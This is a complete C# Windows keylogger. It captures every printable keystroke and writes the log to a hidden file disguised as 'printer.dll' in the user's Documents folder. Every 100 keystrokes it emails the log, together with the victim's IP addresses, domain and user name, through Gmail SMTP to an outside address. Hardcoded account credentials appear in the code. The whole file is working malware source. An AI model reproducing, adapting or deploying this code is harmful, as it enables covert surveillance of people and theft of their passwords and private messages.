using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLogger
{
    internal class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static long numberOfKeystrokes = 0;



        static void Main(string[] args)
        {

            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\printer.dll");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }

            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
            // plan

            // 1 - capture keystrokes

            bool[] previousKeyState = new bool[256];

            while (true)
            {
                // pause and let other program
                Thread.Sleep(5);
                // check
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    bool isKeyPressed = (keyState & 0x8000) != 0;
                    bool wasKeyPressed = previousKeyState[i];

                    //print to console
                    if (isKeyPressed && !wasKeyPressed)
                    {
                        Console.Write((char)i + ", ");

                        //2 - store the strokes into a text file

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                        numberOfKeystrokes++;

                        // send every 100 characters
                        if (numberOfKeystrokes %100 == 0)
                        {
                            SendNewMessage();
                        }
                        

                    }
                    previousKeyState[i] = isKeyPressed;
                }
                

                // 3 - periodically send the contents            
            }



        } // main

        static void SendNewMessage()
        {
            //send the email
            String folderName = Environment.GetFolderPath (Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\printer.dll";

            String logContents = File.ReadAllText(filePath);
            string emailBody = "";

            // create an email message
            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach(var address in host.AddressList)
            {
                emailBody += "Address: " + address;
            }
            emailBody += "\n User: " + Environment.UserDomainName + "\\" + Environment.UserName;
            emailBody += "\nhost" + host;
            emailBody += "\ntime: " + now.ToString() + "\n";
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com" , 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("murdalogger@gmail.com");
            mailMessage.To.Add("murdalogger@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("murdalogger@gmail.com", "ycbkksrahfsindnd");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);
        }
    }
}
